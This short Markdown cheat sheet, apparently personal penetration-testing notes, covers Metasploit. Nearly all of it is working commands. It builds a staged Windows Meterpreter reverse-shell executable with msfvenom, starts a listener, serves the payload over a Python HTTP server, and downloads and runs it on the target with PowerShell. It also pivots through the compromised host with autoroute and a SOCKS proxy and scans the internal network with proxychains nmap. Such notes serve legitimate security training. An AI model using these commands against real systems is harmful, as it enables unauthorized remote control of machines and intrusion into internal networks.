[Offsec's Metasploit Page](https://www.offsec.com/metasploit-unleashed/) has a very good guide for Metasploit usage.

## Staged Reverse Shell

We create the staged executables that we will transfer on the targets

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o met.exe
```

And in msfconsole we start the listener

```shell
sudo msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <HOST-IP>
set LPORT <PORT>
set ExitOnSession false
run -j
```

We start the python server to serve the exploit on the machine

```shell
python3 -m http.server <PORT>
```

On the target we download the file and we run the executable

```powershell
iwr -uri http://<HOST-IP>:<PORT>/met.exe -Outfile met.exe
.\met.exe
```

### One liner Listener

We can use metasploit also via oneliner commands

```shell
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <LHOST>;set LPORT <LPORT>;run;"
```

## Auto-route and Proxy

Metasploit can also help us with port forwarding. We can set up the `autoroute module`

```shell
use multi/manage/autoroute
set session <SESSION>
run
```

And then we start the socks proxy

```shell
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j
```

In this way all the traffic routed through the exploited machine will be redirected in our 127.0.0.1, port 1080. With proxychains we can run command thorugh the proxy and enumerate the internal network

```shell
proxychains nmap -sT -oN -p 80 192.168.1.0/24 
```